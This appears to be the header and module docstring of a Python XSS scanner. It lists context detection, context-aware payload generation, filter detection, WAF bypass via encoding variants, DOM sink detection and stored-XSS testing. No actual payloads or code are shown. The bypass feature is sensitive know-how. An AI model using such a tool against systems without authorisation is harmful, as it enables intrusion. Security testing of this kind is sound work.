from __future__ import annotations
"""XSS Scanner — production-grade context-aware Cross-Site Scripting detection.

Features:
1. Context detection — parses HTML to identify injection contexts:
   - HTML body (between tags)
   - HTML attribute (inside src="", href="", etc.)
   - JavaScript (inside <script> tags)
   - URL (in href, src attributes)
   - CSS (in style attributes)
2. Context-aware payloads — generated per context
3. Reflection analysis — checks if payload appears UNMODIFIED
4. Filter detection — identifies which characters are filtered
5. WAF bypass — tries encoding variants when basic payloads blocked
6. DOM XSS detection — finds dangerous sinks in JS
7. Stored XSS — submits via forms, checks persistence

Every finding has evidence and confidence scoring.
"""

